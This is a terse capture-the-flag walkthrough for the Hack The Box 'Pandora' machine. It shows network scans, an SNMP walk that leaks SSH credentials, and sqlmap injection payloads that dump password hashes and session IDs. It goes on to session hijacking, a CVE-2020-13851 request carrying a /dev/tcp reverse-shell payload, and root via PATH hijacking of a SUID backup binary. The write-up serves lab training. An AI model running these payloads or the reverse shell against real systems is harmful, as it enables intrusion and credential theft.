@@ -1,0 +1,448 @@
+let's enumerate first:
+command: sudo rustscan -a 10.10.11.136 
+result:
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 63
+80/tcp open  http    syn-ack ttl 63
+
+command: sudo nmap -sSVC -A -p 22,80 10.10.11.136
+result:
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 24c295a5c30b3ff3173c68d7af2b5338 (RSA)
+|   256 b1417799469a6c5dd2982fc0329ace03 (ECDSA)
+|_  256 e736433ba9478a190158b2bc89f65108 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Play | Landing
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), Linux 5.3 - 5.4 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 - 5.4 (93%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT      ADDRESS
+1   47.68 ms 10.10.16.1
+2   17.39 ms panda.htb (10.10.11.136)
+
+access: http://10.10.11.136/
+take attention: 
+PLAY is an extention of Panda.HTB, bringing network monitoring solutions to your doorstep.
+
+please put this 10.10.11.136 panda.htb to /etc/hosts
+
+command: sudo nmap -sU -top-ports=100 panda.HTB
+result:
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-02 00:24 WIB
+Nmap scan report for panda.htb (10.10.11.136)
+Host is up (0.019s latency).
+Not shown: 85 closed udp ports (port-unreach)
+PORT      STATE         SERVICE
+68/udp    open|filtered dhcpc
+69/udp    open|filtered tftp
+135/udp   open|filtered msrpc
+161/udp   open          snmp
+445/udp   open|filtered microsoft-ds
+520/udp   open|filtered route
+1028/udp  open|filtered ms-lsa
+3283/udp  open|filtered netassistant
+3703/udp  open|filtered adobeserver-3
+5632/udp  open|filtered pcanywherestat
+20031/udp open|filtered bakbonenetvault
+49153/udp open|filtered unknown
+49185/udp open|filtered unknown
+49191/udp open|filtered unknown
+49200/udp open|filtered unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 84.60 seconds
+
+command: ./feroxbuster -u http://10.10.11.136 -w /snap/feroxbuster/common/wordlist/raft-medium-directories.txt
+result:
+403      GET        9l       28w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+404      GET        9l       31w      274c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+200      GET       33l      171w    13994c http://10.10.11.136/assets/images/testimonials/author-01.png
+200      GET        9l       35w      429c http://10.10.11.136/assets/images/footer/shape-1.svg
+200      GET      234l      437w     4182c http://10.10.11.136/assets/css/animate.css
+200      GET        1l      339w     6616c http://10.10.11.136/assets/images/brands/uideck.svg
+200      GET        1l      730w     7340c http://10.10.11.136/assets/images/hero/dotted-shape.svg
+200      GET     2210l     2818w    26978c http://10.10.11.136/assets/css/lineicons.css
+200      GET        1l       77w     1328c http://10.10.11.136/assets/images/favicon.svg
+200      GET       93l      254w     2626c http://10.10.11.136/assets/js/main.js
+200      GET        3l      148w     8157c http://10.10.11.136/assets/js/wow.min.js
+200      GET        7l     1994w   162720c http://10.10.11.136/assets/css/bootstrap.min.css
+200      GET        1l      609w     8493c http://10.10.11.136/assets/images/footer/shape-2.svg
+200      GET      502l      801w     7736c http://10.10.11.136/assets/scss/_blog-details.scss
+200      GET       22l       41w      444c http://10.10.11.136/assets/scss/_banner.scss
+200      GET      155l      241w     2354c http://10.10.11.136/assets/scss/_footer.scss
+200      GET       81l      155w     1431c http://10.10.11.136/assets/scss/_faq.scss
+200      GET      138l      221w     2016c http://10.10.11.136/assets/scss/_hero.scss
+200      GET      179l      282w     2711c http://10.10.11.136/assets/scss/_common.scss
+200      GET      106l      166w     1676c http://10.10.11.136/assets/scss/_testimonials.scss
+200      GET        1l       23w   205311c http://10.10.11.136/assets/images/hero/hero-image.svg
+200      GET        7l     1019w    78468c http://10.10.11.136/assets/js/bootstrap.bundle.min.js
+200      GET        1l      766w   263054c http://10.10.11.136/assets/images/about/about-image.svg
+301      GET        9l       28w      313c http://10.10.11.136/assets => http://10.10.11.136/assets/
+200      GET        1l      230w     6015c http://10.10.11.136/assets/images/footer/brands/lineicons.svg
+200      GET        1l      343w    12105c http://10.10.11.136/assets/images/footer/brands/ecommerce-html.svg
+200      GET        1l      350w    10753c http://10.10.11.136/assets/images/brands/graygrids.svg
+200      GET        1l      467w    11946c http://10.10.11.136/assets/images/brands/ecommerce-html.svg
+200      GET        1l      447w     7311c http://10.10.11.136/assets/images/hero/brand.svg
+200      GET        1l      111w     1965c http://10.10.11.136/assets/images/logo/logo.svg
+200      GET        1l       31w      622c http://10.10.11.136/assets/images/faq/shape.svg
+200      GET        1l      339w     6613c http://10.10.11.136/assets/images/footer/brands/uideck.svg
+200      GET       27l      174w    14698c http://10.10.11.136/assets/images/testimonials/author-02.png
+200      GET     2613l     5243w    49342c http://10.10.11.136/assets/css/ud-styles.css
+200      GET       35l      183w    14785c http://10.10.11.136/assets/images/testimonials/author-03.png
+200      GET        1l       87w     1454c http://10.10.11.136/assets/images/brands/ayroui.svg
+200      GET        1l      296w     5850c http://10.10.11.136/assets/images/brands/lineicons.svg
+200      GET        9l       35w      474c http://10.10.11.136/assets/images/footer/shape-3.svg
+200      GET        1l      224w    10862c http://10.10.11.136/assets/images/footer/brands/graygrids.svg
+200      GET        1l       87w     1451c http://10.10.11.136/assets/images/footer/brands/ayroui.svg
+200      GET      907l     2081w    33560c http://10.10.11.136/index.html
+200      GET      907l     2081w    33560c http://10.10.11.136/
+200      GET       27l       32w    48044c http://10.10.11.136/assets/css/ud-styles.css.map
+200      GET        1l      436w     8716c http://10.10.11.136/assets/images/brands/tailwindtemplates.svg
+200      GET      122l      211w     2138c http://10.10.11.136/assets/scss/_pricing.scss
+200      GET       73l      122w     1416c http://10.10.11.136/assets/scss/_mixin.scss
+200      GET       31l       82w      459c http://10.10.11.136/assets/scss/_default.scss
+200      GET        1l       63w      965c http://10.10.11.136/assets/images/blog/quote-bg.svg
+200      GET        1l      111w     1968c http://10.10.11.136/assets/images/logo/logo-2.svg
+200      GET       29l       56w      536c http://10.10.11.136/assets/scss/ud-styles.scss
+200      GET        1l       59w      931c http://10.10.11.136/assets/images/banner/banner-bg.svg
+200      GET       99l      175w     1471c http://10.10.11.136/assets/scss/_404.scss
+200      GET       20l      133w    10610c http://10.10.11.136/assets/images/blog/author-01.png
+200      GET        1l      155w     1622c http://10.10.11.136/assets/images/blog/dotted-shape.svg
+200      GET      132l      223w     2004c http://10.10.11.136/assets/scss/_contact.scss
+200      GET       97l      150w     1467c http://10.10.11.136/assets/scss/_blog.scss
+200      GET      110l      178w     1858c http://10.10.11.136/assets/scss/_features.scss
+200      GET      110l      174w     1783c http://10.10.11.136/assets/scss/_login.scss
+200      GET       81l      131w     1226c http://10.10.11.136/assets/scss/_team.scss
+200      GET        8l       57w      455c http://10.10.11.136/assets/scss/_variables.scss
+200      GET      297l      529w     5316c http://10.10.11.136/assets/scss/_header.scss
+200      GET       78l      139w     1147c http://10.10.11.136/assets/scss/_about.scss
+200      GET       72l      384w    26960c http://10.10.11.136/assets/images/blog/article-author-01.png
+200      GET       58l      396w    24661c http://10.10.11.136/assets/images/blog/article-author-03.png
+200      GET       64l      372w    28012c http://10.10.11.136/assets/images/blog/article-author-02.png
+200      GET        1l       14w      206c http://10.10.11.136/assets/images/team/shape-2.svg
+200      GET       80l      414w    26651c http://10.10.11.136/assets/images/blog/article-author-04.png
+200      GET        1l      155w     1625c http://10.10.11.136/assets/images/404/dotted-shape.svg
+200      GET        4l       31w      380c http://10.10.11.136/assets/images/404/shape-1.svg
+200      GET        4l       31w      384c http://10.10.11.136/assets/images/404/shape-2.svg
+200      GET        1l      514w     5303c http://10.10.11.136/assets/images/team/dotted-shape.svg
+200      GET      327l     1717w   138665c http://10.10.11.136/assets/fonts/LineIcons.woff
+200      GET      254l     1427w   113210c http://10.10.11.136/assets/fonts/LineIcons.woff2
+200      GET      290l     1846w   119742c http://10.10.11.136/assets/images/blog/bannder-ad.png
+200      GET     2001l     7264w   151045c http://10.10.11.136/assets/fonts/LineIcons.eot
+200      GET      230l     1276w   100315c http://10.10.11.136/assets/images/team/team-04.png
+200      GET     2001l     7262w   150863c http://10.10.11.136/assets/fonts/LineIcons.ttf
+200      GET      319l     1954w   151043c http://10.10.11.136/assets/images/blog/blog-03.jpg
+200      GET      225l     1315w   108072c http://10.10.11.136/assets/images/team/team-01.png
+200      GET      228l     1302w   102185c http://10.10.11.136/assets/images/team/team-02.png
+200      GET      379l     2166w   162485c http://10.10.11.136/assets/images/blog/blog-01.jpg
+200      GET      177l     1156w    99288c http://10.10.11.136/assets/images/team/team-03.png
+200      GET     1616l    75767w   593511c http://10.10.11.136/assets/fonts/LineIcons.svg
+200      GET      592l     3151w   242515c http://10.10.11.136/assets/images/blog/blog-02.jpg
+200      GET     6061l    33168w  2270905c http://10.10.11.136/assets/images/blog/blog-details-01.jpg
+[####################] - 18s    30164/30164   0s      found:83      errors:15     
+[####################] - 18s    30000/30000   1675/s  http://10.10.11.136/ 
+[####################] - 6s     30000/30000   4877/s  http://10.10.11.136/assets/images/hero/ => Directory listing
+[####################] - 6s     30000/30000   4859/s  http://10.10.11.136/assets/images/about/ => Directory listing
+[####################] - 6s     30000/30000   4815/s  http://10.10.11.136/assets/ => Directory listing
+[####################] - 6s     30000/30000   4841/s  http://10.10.11.136/assets/images/testimonials/ => Directory listing
+[####################] - 6s     30000/30000   4825/s  http://10.10.11.136/assets/images/ => Directory listing
+[####################] - 0s     30000/30000   182927/s http://10.10.11.136/assets/js/ => Directory listing
+[####################] - 6s     30000/30000   4769/s  http://10.10.11.136/assets/scss/ => Directory listing
+[####################] - 6s     30000/30000   4866/s  http://10.10.11.136/assets/images/footer/ => Directory listing
+[####################] - 6s     30000/30000   4865/s  http://10.10.11.136/assets/images/brands/ => Directory listing
+[####################] - 6s     30000/30000   4823/s  http://10.10.11.136/assets/images/logo/ => Directory listing
+[####################] - 6s     30000/30000   4822/s  http://10.10.11.136/assets/images/banner/ => Directory listing
+[####################] - 6s     30000/30000   4756/s  http://10.10.11.136/assets/images/faq/ => Directory listing
+[####################] - 7s     30000/30000   4492/s  http://10.10.11.136/assets/images/team/ => Directory listing
+[####################] - 8s     30000/30000   3874/s  http://10.10.11.136/assets/images/blog/ => Directory listing
+[####################] - 0s     30000/30000   247934/s http://10.10.11.136/assets/css/ => Directory listing
+[####################] - 1s     30000/30000   40706/s http://10.10.11.136/assets/fonts/ => Directory listing
+[####################] - 0s     30000/30000   159574/s http://10.10.11.136/assets/images/404/ => Directory listing
+
+command: wfuzz -u http://panda.htb -H "Host: FUZZ.panda.htb" -w /snap/seclists/34/Discovery/DNS/subdomains-top1million-5000.txt --hh 33560
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://panda.htb/
+Total requests: 4989
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                            
+=====================================================================
+
+
+Total time: 0
+Processed Requests: 4989
+Filtered Requests: 4989
+Requests/sec.: 0
+
+command: snmpwalk -v 2c -c public 10.10.11.136 | tee snmp-full
+wait for 1 minutes for scan process list.
+open snmp-full search for /bin/bash.
+result:
+iso.3.6.1.2.1.25.4.2.1.5.833 = STRING: "-f"
+iso.3.6.1.2.1.25.4.2.1.5.835 = STRING: "-f"
+iso.3.6.1.2.1.25.4.2.1.5.845 = STRING: "-c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'"
+iso.3.6.1.2.1.25.4.2.1.5.858 = STRING: "-f"
+iso.3.6.1.2.1.25.4.2.1.5.870 = STRING: "-LOw -u Debian-snmp -g Debian-snmp -I -smux mteTrigger mteTriggerConf -f -p /run/snmpd.pid"
+
+let's ssh daniel.
+command: ssh daniel@10.10.11.136
+password: HotelBabylon23
+
+command: cd /var/www/pandora/pandora_console
+command: ls -al include/config.php
+-rw------- 1 matt matt 413 Dec  3  2021 include/config.php
+
+let's tunneling target host localhsot:80 to our host 9001
+command: ssh daniel@10.10.11.136 -L 9001:localhost:80
+
+access: http://127.0.0.1:9001/pandora_console/
+some sql injection on pandora_console
+sqli: http://127.0.0.1:9001/pandora_console/include/chart_generator.php?session_id=1'
+
+command: sqlmap -u 'http://127.0.0.1:9001/pandora_console/include/chart_generator.php?session_id=1'
+result:
+Parameter: session_id (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
+    Payload: session_id=-7112' OR 4640=4640#
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: session_id=1' OR (SELECT 7911 FROM(SELECT COUNT(*),CONCAT(0x7176706b71,(SELECT (ELT(7911=7911,1))),0x71786b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- vTPH
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: session_id=1' AND (SELECT 9756 FROM (SELECT(SLEEP(5)))osYJ)-- KFot
+
+command: sqlmap -u 'http://127.0.0.1:9001/pandora_console/include/chart_generator.php?session_id=1' --dbs
+result:
+available databases [2]:
+[*] information_schema
+[*] pandora
+
+command: sqlmap -u 'http://127.0.0.1:9001/pandora_console/include/chart_generator.php?session_id=1' -D pandora --tables
+some table:
+| talert_actions                     |
+| talert_commands                    |
+| talert_snmp                        |
+| talert_snmp_action                 |
+| talert_special_days                |
+| talert_template_module_actions     |
+| talert_template_modules            |
+| talert_templates                   |
+| tattachment                        |
+| tautoconfig                        |
+| tautoconfig_actions                |
+| tautoconfig_rules                  |
+
+command: sqlmap -u 'http://127.0.0.1:9001/pandora_console/include/chart_generator.php?session_id=1' -D pandora -T tpassword_history --dump
+result:
++---------+---------+---------------------+----------------------------------+---------------------+
+| id_pass | id_user | date_end            | password                         | date_begin          |
++---------+---------+---------------------+----------------------------------+---------------------+
+| 1       | matt    | 0000-00-00 00:00:00 | f655f807365b6dc602b31ab3d6d43acc | 2021-06-11 17:28:54 |
+| 2       | daniel  | 0000-00-00 00:00:00 | 76323c174bd49ffbbdedf678f6cc89a6 | 2021-06-17 00:11:54 |
++---------+---------+---------------------+----------------------------------+---------------------+
+
+command: sqlmap -u 'http://127.0.0.1:9001/pandora_console/include/chart_generator.php?session_id=1' -D pandora -T tsessions_php --dump -where "data<>''"
+result:
++----------------------------+-----------------------------------------------------+-------------+
+| id_session                 | data                                                | last_active |
++----------------------------+-----------------------------------------------------+-------------+
+| 09vao3q1dikuoi1vhcvhcjjbc6 | id_usuario|s:6:"daniel";                            | 1638783555  |
+| 346uqacafar8pipuppubqet7ut | id_usuario|s:6:"daniel";                            | 1638540332  |
+| 3re2j9ocevo427ch6j1no4hu68 | id_usuario|s:6:"daniel";                            | 1688226564  |
+| 4nsbidcmgfoh1gilpv8p5hpi2s | id_usuario|s:6:"daniel";                            | 1638535373  |
+| 5i352tsdh7vlohth30ve4o0air | id_usuario|s:6:"daniel";                            | 1638281946  |
+| 69gbnjrc2q42e8aqahb1l2s68n | id_usuario|s:6:"daniel";                            | 1641195617  |
+| 8k7qgv2kdua262ufko1nsrpjd3 | id_usuario|s:6:"daniel";                            | 1688222695  |
+| 8m2e6h8gmphj79r9pq497vpdre | id_usuario|s:6:"daniel";                            | 1638446321  |
+| 9vv4godmdam3vsq8pu78b52em9 | id_usuario|s:6:"daniel";                            | 1638881787  |
+| agfdiriggbt86ep71uvm1jbo3f | id_usuario|s:6:"daniel";                            | 1638881664  |
+| f0qisbrojp785v1dmm8cu1vkaj | id_usuario|s:6:"daniel";                            | 1641200284  |
+| g0kteepqaj1oep6u7msp0u38kv | id_usuario|s:6:"daniel";                            | 1638783230  |
+| g4e01qdgk36mfdh90hvcc54umq | id_usuario|s:4:"matt";alert_msg|a:0:{}new_chat|b:0; | 1638796349  |
+| hsftvg6j5m3vcmut6ln6ig8b0f | id_usuario|s:6:"daniel";                            | 1638168492  |
+| jecd4v8f6mlcgn4634ndfl74rd | id_usuario|s:6:"daniel";                            | 1638456173  |
+| o3kuq4m5t5mqv01iur63e1di58 | id_usuario|s:6:"daniel";                            | 1638540482  |
+| oi2r6rjq9v99qt8q9heu3nulon | id_usuario|s:6:"daniel";                            | 1637667827  |
+| pjp312be5p56vke9dnbqmnqeot | id_usuario|s:6:"daniel";                            | 1638168416  |
+| rgku3s5dj4mbr85tiefv53tdoa | id_usuario|s:6:"daniel";                            | 1638889082  |
+| u5ktk2bt6ghb7s51lka5qou4r4 | id_usuario|s:6:"daniel";                            | 1638547193  |
+| u74bvn6gop4rl21ds325q80j0e | id_usuario|s:6:"daniel";                            | 1638793297  |
++----------------------------+-----------------------------------------------------+-------------+
+
+put to sessions file: 
+09vao3q1dikuoi1vhcvhcjjbc6
+346uqacafar8pipuppubqet7ut
+3re2j9ocevo427ch6j1no4hu68
+4nsbidcmgfoh1gilpv8p5hpi2s
+5i352tsdh7vlohth30ve4o0air
+69gbnjrc2q42e8aqahb1l2s68n
+8k7qgv2kdua262ufko1nsrpjd3
+8m2e6h8gmphj79r9pq497vpdre
+9vv4godmdam3vsq8pu78b52em9
+agfdiriggbt86ep71uvm1jbo3f
+f0qisbrojp785v1dmm8cu1vkaj
+g0kteepqaj1oep6u7msp0u38kv
+g4e01qdgk36mfdh90hvcc54umq
+hsftvg6j5m3vcmut6ln6ig8b0f
+jecd4v8f6mlcgn4634ndfl74rd
+o3kuq4m5t5mqv01iur63e1di58
+oi2r6rjq9v99qt8q9heu3nulon
+pjp312be5p56vke9dnbqmnqeot
+rgku3s5dj4mbr85tiefv53tdoa
+u5ktk2bt6ghb7s51lka5qou4r4
+u74bvn6gop4rl21ds325q80j0e
+
+wfuzz it
+command: wfuzz -u http://127.0.0.1:9001/pandora_console/ -b PHPSESSID=FUZZ -w sessions
+result:
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                              
+=====================================================================
+
+000000001:   200        247 L    665 W      13857 Ch    "09vao3q1dikuoi1vhcvhcjjbc6"                                                                         
+000000007:   200        247 L    665 W      13857 Ch    "8k7qgv2kdua262ufko1nsrpjd3"                                                                         
+000000003:   200        247 L    665 W      13857 Ch    "3re2j9ocevo427ch6j1no4hu68"                                                                         
+000000015:   200        247 L    665 W      13857 Ch    "jecd4v8f6mlcgn4634ndfl74rd"                                                                         
+000000017:   200        247 L    665 W      13857 Ch    "oi2r6rjq9v99qt8q9heu3nulon"                                                                         
+000000014:   200        247 L    665 W      13857 Ch    "hsftvg6j5m3vcmut6ln6ig8b0f"                                                                         
+000000016:   200        247 L    665 W      13857 Ch    "o3kuq4m5t5mqv01iur63e1di58"                                                                         
+000000012:   200        247 L    665 W      13857 Ch    "g0kteepqaj1oep6u7msp0u38kv"                                                                         
+000000011:   200        247 L    665 W      13857 Ch    "f0qisbrojp785v1dmm8cu1vkaj"                                                                         
+000000010:   200        247 L    665 W      13857 Ch    "agfdiriggbt86ep71uvm1jbo3f"                                                                         
+000000009:   200        247 L    665 W      13857 Ch    "9vv4godmdam3vsq8pu78b52em9"                                                                         
+000000006:   200        247 L    665 W      13857 Ch    "69gbnjrc2q42e8aqahb1l2s68n"                                                                         
+000000013:   200        1386 L   4653 W     75210 Ch    "g4e01qdgk36mfdh90hvcc54umq"                                                                         
+000000005:   200        247 L    665 W      13857 Ch    "5i352tsdh7vlohth30ve4o0air"                                                                         
+000000008:   200        247 L    665 W      13857 Ch    "8m2e6h8gmphj79r9pq497vpdre"                                                                         
+000000002:   200        247 L    665 W      13857 Ch    "346uqacafar8pipuppubqet7ut"                                                                         
+000000004:   200        247 L    665 W      13857 Ch    "4nsbidcmgfoh1gilpv8p5hpi2s"                                                                         
+000000018:   200        247 L    665 W      13857 Ch    "pjp312be5p56vke9dnbqmnqeot"                                                                         
+000000020:   200        247 L    665 W      13857 Ch    "u5ktk2bt6ghb7s51lka5qou4r4"                                                                         
+000000019:   200        247 L    665 W      13857 Ch    "rgku3s5dj4mbr85tiefv53tdoa"                                                                         
+000000021:   200        247 L    665 W      13857 Ch    "u74bvn6gop4rl21ds325q80j0e"                                                                         
+
+Total time: 0
+Processed Requests: 21
+Filtered Requests: 0
+Requests/sec.: 0
+
+put this g4e01qdgk36mfdh90hvcc54umq to PHPSESSID on cookie.
+
+some RCE on pandora_console.
+CVE-2020-13851
+
+access: http://127.0.0.1:9001/pandora_console/index.php?sec=eventos&sec2=operation/events/events
+filter -> filter it. intercept http request.
+
+put this payload exploit: 
+page=include/ajax/events&perform_event_response=10000000&target=bash+-c+"bash+-i+>%26+/dev/tcp/10.10.16.19/7979+0>%261"&response_id=1
+
+burpsuite repeater: 
+POST /pandora_console/ajax.php HTTP/1.1
+Host: 127.0.0.1:9001
+Content-Length: 2247
+sec-ch-ua: 
+Accept: application/json, text/javascript, */*; q=0.01
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+sec-ch-ua-mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
+sec-ch-ua-platform: ""
+Origin: http://127.0.0.1:9001
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: http://127.0.0.1:9001/pandora_console/index.php?sec=eventos&sec2=operation/events/events
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: PHPSESSID=g4e01qdgk36mfdh90hvcc54umq
+Connection: close
+
+page=include/ajax/events&perform_event_response=10000000&target=bash+-c+"bash+-i+>%26+/dev/tcp/10.10.16.19/7979+0>%261"&response_id=1
+
+shell suddeny disconnect, please put id_rsa.pub to /home/matt/.ssh
+then reconnect again.
+
+command: ssh -i id_rsa_new matt@10.10.11.136
+
+command: find / -perm -4000 -ls 2>/dev/null
+   264644    164 -rwsr-xr-x   1 root     root       166056 Jan 19  2021 /usr/bin/sudo
+   265010     32 -rwsr-xr-x   1 root     root        31032 May 26  2021 /usr/bin/pkexec
+   267386     84 -rwsr-xr-x   1 root     root        85064 Jul 14  2021 /usr/bin/chfn
+   262764     44 -rwsr-xr-x   1 root     root        44784 Jul 14  2021 /usr/bin/newgrp
+   267389     88 -rwsr-xr-x   1 root     root        88464 Jul 14  2021 /usr/bin/gpasswd
+   264713     40 -rwsr-xr-x   1 root     root        39144 Jul 21  2020 /usr/bin/umount
+   262929     20 -rwsr-x---   1 root     matt        16816 Dec  3  2021 /usr/bin/pandora_backup
+   267390     68 -rwsr-xr-x   1 root     root        68208 Jul 14  2021 /usr/bin/passwd
+   264371     56 -rwsr-xr-x   1 root     root        55528 Jul 21  2020 /usr/bin/mount
+   264643     68 -rwsr-xr-x   1 root     root        67816 Jul 21  2020 /usr/bin/su
+   264040     56 -rwsr-sr-x   1 daemon   daemon      55560 Nov 12  2018 /usr/bin/at
+   264219     40 -rwsr-xr-x   1 root     root        39144 Mar  7  2020 /usr/bin/fusermount
+   267387     52 -rwsr-xr-x   1 root     root        53040 Jul 14  2021 /usr/bin/chsh
+   262815    464 -rwsr-xr-x   1 root     root       473576 Jul 23  2021 /usr/lib/openssh/ssh-keysign
+   264920     52 -rwsr-xr--   1 root     messagebus    51344 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+   264927     16 -rwsr-xr-x   1 root     root          14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
+   266611     24 -rwsr-xr-x   1 root     root          22840 May 26  2021 /usr/lib/policykit-1/polkit-agent-helper-1
+
+command: pandora_backup
+result:
+...
+/var/www/pandora/pandora_console/vendor/egulias/email-validator/EmailValidator/Validation/Error/SpoofEmail.php
+/var/www/pandora/pandora_console/vendor/egulias/email-validator/EmailValidator/Validation/Error/RFCWarnings.php
+/var/www/pandora/pandora_console/vendor/egulias/email-validator/EmailValidator/Validation/RFCValidation.php
+/var/www/pandora/pandora_console/vendor/egulias/email-validator/EmailValidator/Validation/MultipleValidationWithAnd.php
+/var/www/pandora/pandora_console/vendor/egulias/email-validator/EmailValidator/Validation/NoRFCWarningsValidation.php
+/var/www/pandora/pandora_console/vendor/egulias/email-validator/EmailValidator/Validation/MultipleErrors.php
+/var/www/pandora/pandora_console/vendor/egulias/email-validator/EmailValidator/Validation/EmailValidation.php
+/var/www/pandora/pandora_console/vendor/egulias/email-validator/EmailValidator/Validation/DNSCheckValidation.php
+/var/www/pandora/pandora_console/vendor/egulias/email-validator/EmailValidator/EmailParser.php
+...
+
+command: ltrace pandora_backup 
+getuid()                                                                                              = 1000
+geteuid()                                                                                             = 1000
+setreuid(1000, 1000)                                                                                  = 0
+puts("PandoraFMS Backup Utility"PandoraFMS Backup Utility
+)                                                                     = 26
+puts("Now attempting to backup Pandora"...Now attempting to backup PandoraFMS client
+)                                                           = 43
+system("tar -cvf /root/.backup/pandora-b"...tar: /root/.backup/pandora-backup.tar.gz: Cannot open: Permission denied
+tar: Error is not recoverable: exiting now
+ <no return ...>
+--- SIGCHLD (Child exited) ---
+<... system resumed> )                                                                                = 512
+puts("Backup failed!\nCheck your permis"...Backup failed!
+Check your permissions!
+)                                                          = 39
++++ exited (status 1) +++
+
+command: cd /dev/shm
+command: export PATH=/dev/shm:$PATH
+command: echo $PATH
+/dev/shm:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+
+put below code to tar:
+#!/bin/bash
+
+bash
+
+command: chmod +x tar
+command: pandora_backup
+command: cat /root/root.txt
+e51d3555434a53d9ac14931e42b42183
+
+resource:
+https://0xdf.gitlab.io/2022/05/21/htb-pandora.html
+
